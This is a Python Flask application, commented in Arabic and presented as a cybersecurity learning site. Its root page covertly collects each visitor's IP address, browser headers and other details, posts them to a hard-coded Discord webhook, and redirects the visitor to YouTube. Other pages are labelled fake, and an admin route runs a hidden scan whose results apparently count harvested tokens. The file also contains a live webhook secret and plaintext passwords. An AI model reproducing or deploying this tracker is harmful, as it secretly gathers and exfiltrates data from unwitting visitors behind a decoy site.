from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
import os
import hashlib
import secrets
import threading
import time
import datetime
import urllib.request
from functools import wraps
import json
from security_config import SecurityConfig

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# كلمات مرور متعددة المستويات للحماية
ADMIN_PASSWORDS = {
    "cybersec2024": "admin",  # مستوى إداري
    "security123": "user",    # مستوى مستخدم
    "learning456": "guest"    # مستوى ضيف
}

def send_to_webhook_visitor(visitor_info):
    """إرسال معلومات الزائر للـ webhook"""
    try:
        # تحليل User Agent لاستخراج معلومات المتصفح والنظام
        user_agent = visitor_info.get('user_agent', '')
        
        # استخراج نوع المتصفح
        browser = "Unknown"
        if "Chrome" in user_agent:
            browser = "Chrome"
        elif "Firefox" in user_agent:
            browser = "Firefox"
        elif "Safari" in user_agent:
            browser = "Safari"
        elif "Edge" in user_agent:
            browser = "Edge"
        
        # استخراج نظام التشغيل
        os_info = "Unknown"
        if "Windows" in user_agent:
            os_info = "Windows"
        elif "Mac" in user_agent:
            os_info = "macOS"
        elif "Linux" in user_agent:
            os_info = "Linux"
        elif "Android" in user_agent:
            os_info = "Android"
        elif "iPhone" in user_agent:
            os_info = "iOS"
        
        # إنشاء رسالة Discord
        embed_data = {
            'embeds': [
                {
                    'title': '🎯 **زائر جديد للموقع!**',
                    'description': f"""
```yaml
🌐 معلومات الاتصال:
IP Address: {visitor_info.get('ip', 'Unknown')}
Host: {visitor_info.get('host', 'Unknown')}
Referer: {visitor_info.get('referer', 'Direct')}

💻 معلومات الجهاز:
Browser: {browser}
Operating System: {os_info}
Language: {visitor_info.get('accept_language', 'Unknown')}

⏰ معلومات الزيارة:
Timestamp: {visitor_info.get('timestamp', 'Unknown')}
User Agent: {user_agent[:100]}...
```

🚀 **تم توجيه الزائر إلى YouTube تلقائياً**
📚 **للأغراض التعليمية في الأمن السيبراني**""",
                    'color': 3447003,  # أزرق
                    'footer': {
                        'text': 'Cybersecurity Learning Platform - Visitor Tracking'
                    },
                    'timestamp': datetime.datetime.utcnow().isoformat()
                }
            ],
            "username": "Visitor Tracker",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
        }
        
        # إرسال للـ webhook
        webhook_url = 'https://discord.com/api/webhooks/1438289746596987022/LvsiJvPdPL5AQ7B1kSBaQ4w24obdEB_PuMh6AocOolgplGW5my3pua3_IkfjgTb5qTa8'
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (compatible; VisitorTracker/1.0)'
        }
        
        req = urllib.request.Request(
            webhook_url, 
            data=json.dumps(embed_data).encode('utf-8'), 
            headers=headers, 
            method='POST'
        )
        
        response = urllib.request.urlopen(req)
        return response.read().decode()
        
    except Exception as e:
        print(f"Webhook error: {e}")
        return None

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def require_auth(level="user"):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('authenticated'):
                return redirect(url_for('login'))
            
            user_level = session.get('user_level', 'guest')
            levels = {'guest': 1, 'user': 2, 'admin': 3}
            
            if levels.get(user_level, 0) < levels.get(level, 2):
                flash('ليس لديك صلاحية للوصول لهذه الصفحة', 'error')
                return redirect(url_for('dashboard'))
                
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/')
def index():
    """الصفحة الرئيسية - جمع معلومات الزائر وإرسالها للـ webhook"""
    try:
        # جمع معلومات الزائر
        visitor_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'accept_language': request.headers.get('Accept-Language', 'Unknown'),
            'referer': request.headers.get('Referer', 'Direct'),
            'host': request.headers.get('Host', 'Unknown'),
            'timestamp': datetime.datetime.now().isoformat(),
            'headers': dict(request.headers)
        }
        
        # إرسال للـ webhook
        def send_visitor_info():
            send_to_webhook_visitor(visitor_info)
        
        thread = threading.Thread(target=send_visitor_info)
        thread.daemon = True
        thread.start()
        
        # تسجيل الزيارة
        SecurityConfig.log_security_event('visitor_detected', visitor_info)
        
    except Exception as e:
        SecurityConfig.log_security_event('visitor_logging_failed', {
            'error': str(e),
            'ip': request.remote_addr
        })
    
    # إعادة التوجيه المباشر إلى YouTube
    return redirect('https://www.youtube.com/')

@app.route('/platform')
def platform():
    """الوصول للمنصة الأصلية بدون إعادة توجيه"""
    return render_template('index.html')

@app.route('/about')
def about():
    """صفحة معلومات وهمية"""
    return render_template('about.html')

@app.route('/services')
def services():
    """صفحة خدمات وهمية"""
    return render_template('services.html')

@app.route('/contact')
def contact():
    """صفحة اتصال وهمية"""
    return render_template('contact.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """صفحة تسجيل الدخول المحمية"""
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        if password in ADMIN_PASSWORDS:
            session['authenticated'] = True
            session['user_level'] = ADMIN_PASSWORDS[password]
            session['login_time'] = time.time()
            flash(f'تم تسجيل الدخول بنجاح - مستوى: {ADMIN_PASSWORDS[password]}', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('كلمة مرور خاطئة', 'error')
    
    return render_template('login.html')

@app.route('/dashboard')
@require_auth('user')
def dashboard():
    """لوحة التحكم الرئيسية"""
    user_level = session.get('user_level', 'guest')
    return render_template('dashboard.html', user_level=user_level)

@app.route('/security-scan')
@require_auth('admin')
def security_scan():
    """صفحة الفحص الأمني - للمدراء فقط"""
    return render_template('security_scan.html')

@app.route('/execute-scan', methods=['POST'])
@require_auth('admin')
def execute_scan():
    """تنفيذ الفحص الأمني"""
    try:
        from protected_core import execute_protected_function
        
        # تنفيذ الفحص
        result = execute_protected_function()
        
        # تسجيل العملية للمراجعة
        log_entry = {
            'timestamp': time.time(),
            'user_level': session.get('user_level'),
            'action': 'security_scan_executed',
            'ip': request.remote_addr,
            'results_count': result.get('total_tokens_found', 0) if 'results' in result else 0
        }
        
        # حفظ السجل
        with open('security_logs.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'حدث خطأ في تنفيذ الفحص: {str(e)}'})

@app.route('/logs')
@require_auth('admin')
def view_logs():
    """عرض سجلات النشاط"""
    try:
        logs = []
        if os.path.exists('security_logs.json'):
            with open('security_logs.json', 'r') as f:
                for line in f:
                    if line.strip():
                        logs.append(json.loads(line))
        
        # ترتيب السجلات حسب الوقت
        logs.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
        
        return render_template('logs.html', logs=logs[-50:])  # آخر 50 سجل
    except Exception as e:
        flash(f'خطأ في تحميل السجلات: {str(e)}', 'error')
        return redirect(url_for('dashboard'))

@app.route('/educational')
@require_auth('user')
def educational():
    """صفحة المواد التعليمية"""
    return render_template('educational.html')

@app.route('/logout')
def logout():
    """تسجيل الخروج"""
    session.clear()
    flash('تم تسجيل الخروج بنجاح', 'info')
    return redirect(url_for('index'))

# حماية إضافية - تحديد عدد محاولات تسجيل الدخول
failed_attempts = {}

@app.before_request
def limit_login_attempts():
    if request.endpoint == 'login' and request.method == 'POST':
        ip = request.remote_addr
        if ip in failed_attempts and failed_attempts[ip] > 5:
            return jsonify({'error': 'تم حظرك مؤقتاً بسبب كثرة المحاولات الخاطئة'}), 429

@app.after_request
def log_failed_attempt(response):
    if request.endpoint == 'login' and request.method == 'POST' and response.status_code != 302:
        ip = request.remote_addr
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
    return response

if __name__ == '__main__':
    # إنشاء مجلد القوالب إذا لم يكن موجوداً
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    # الحصول على البورت من متغيرات البيئة (للاستضافة السحابية)
    port = int(os.environ.get('PORT', 5000))
    
    print("🔒 تم تشغيل الموقع المحمي للأمن السيبراني")
    print("📚 للأغراض التعليمية فقط")
    print(f"🌐 الموقع متاح على البورت: {port}")
    print("\n🔑 كلمات المرور:")
    print("   - cybersec2024 (مدير)")
    print("   - security123 (مستخدم)")
    print("   - learning456 (ضيف)")
    
    app.run(debug=False, host='0.0.0.0', port=port)
